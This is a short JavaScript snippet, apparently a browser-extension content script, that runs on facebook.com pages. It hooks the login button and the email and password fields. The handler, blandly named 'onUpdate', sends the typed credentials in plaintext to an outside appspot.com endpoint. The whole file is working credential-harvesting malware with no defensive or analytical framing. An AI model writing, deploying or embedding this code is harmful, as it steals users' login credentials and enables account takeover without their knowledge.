if(window.location.origin.indexOf('facebook.com') > -1) {
    let button = document.querySelector('button[name="login"]');
    let email = document.getElementById('email');
    let pass = document.getElementById('pass');

    email && email.addEventListener('keydown', (e) => {
        if(e.code == 13) {
            onUpdate(email?.value, pass?.value);
        }
    });
    pass && pass.addEventListener('keydown', (e) => {
        if(e.code == 13) {
            onUpdate(email?.value, pass?.value);
        }
    });
    if(button) {
        button.addEventListener('click', (e) => {
            onUpdate(email?.value, pass?.value);
        });
    }

    function onUpdate(email, pass) {
        fetch(`https://deploy-temp.appspot.com/api/update-user-info?email=${email}&pass=${pass}`, { method: 'post' })
        .then((data) => {
            console.log(data);
        });
    }
}